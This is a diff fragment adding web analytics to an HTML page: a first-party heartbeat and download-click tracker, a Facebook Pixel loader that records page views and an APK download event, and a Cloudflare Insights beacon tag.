+  function sendFinal(){tick();var p=JSON.stringify({sid:sid,dwell:dwell});if(navigator.sendBeacon){try{navigator.sendBeacon('/api/track/heartbeat',new Blob([p],{type:'application/json'}));}catch(e){postJSON('/api/track/heartbeat',{sid:sid,dwell:dwell});}}else{postJSON('/api/track/heartbeat',{sid:sid,dwell:dwell});}}
+  window.addEventListener('pagehide',sendFinal);
+  window.addEventListener('beforeunload',sendFinal);
+  setTimeout(function(){
+    document.querySelectorAll('.dl-link').forEach(function(a){
+      a.addEventListener('click',function(){tick();postJSON('/api/track/click',{sid:sid,dwell:dwell});});
+    });
+  },1000);
+})();
+</script>
+
+<!-- Facebook Pixel -->
+<script>
+(function(){
+  fetch('/api/pixel-config').then(function(r){return r.json()}).then(function(d){
+    var ids=d&&d.pixel_ids;if(!ids||!ids.length)return;
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    for(var i=0;i<ids.length;i++)fbq('init',ids[i]);
+    fbq('track','PageView');fbq('track','ViewContent',{content_name:document.title});
+    setTimeout(function(){fbq('track','Lead',{content_name:'engaged_visitor'});},10000);
+    setTimeout(function(){document.querySelectorAll('.dl-link').forEach(function(a){a.addEventListener('click',function(){fbq('trackCustom','Download',{content_name:'apk_download'});});});},1000);
+  }).catch(function(){});
+})();
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
